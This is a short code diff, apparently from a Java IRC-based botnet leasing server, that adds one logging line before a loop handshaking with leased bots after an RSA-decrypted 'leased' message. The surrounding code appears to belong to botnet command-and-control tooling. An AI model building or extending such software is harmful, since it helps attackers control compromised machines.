@@ -190,6 +190,7 @@ public class BotnetLeaseServer extends PircBot {
 						String done = m.decryptRSA(chat.readLine());
 						if (done.equals("leased")) {
 							for (String name : leasedBots) {
+								System.out.println("Handshaking with " + name);
 								handshake(name);
 							}
 						}
